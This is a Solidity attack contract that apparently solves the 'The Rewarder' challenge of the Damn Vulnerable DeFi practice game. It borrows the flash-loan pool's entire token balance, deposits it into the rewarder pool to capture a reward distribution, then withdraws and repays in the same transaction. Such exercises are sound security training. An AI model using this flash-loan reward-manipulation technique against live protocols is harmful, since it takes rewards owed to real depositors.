// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './FlashLoanerPool.sol';
import '../DamnValuableToken.sol';
import './TheRewarderPool.sol';

contract Attack{

    FlashLoanerPool flashPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken liquidityToken;

    constructor(FlashLoanerPool _flashPool, TheRewarderPool _rewarderPool, DamnValuableToken _liquidityToken){
        flashPool = _flashPool;
        rewarderPool = _rewarderPool;
        liquidityToken = _liquidityToken;
    }

    function attack()external{
        flashPool.flashLoan(liquidityToken.balanceOf(address(flashPool)));
    }

    function receiveFlashLoan(uint256 amount)external{
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);

        liquidityToken.transfer(address(flashPool), amount);
    }
}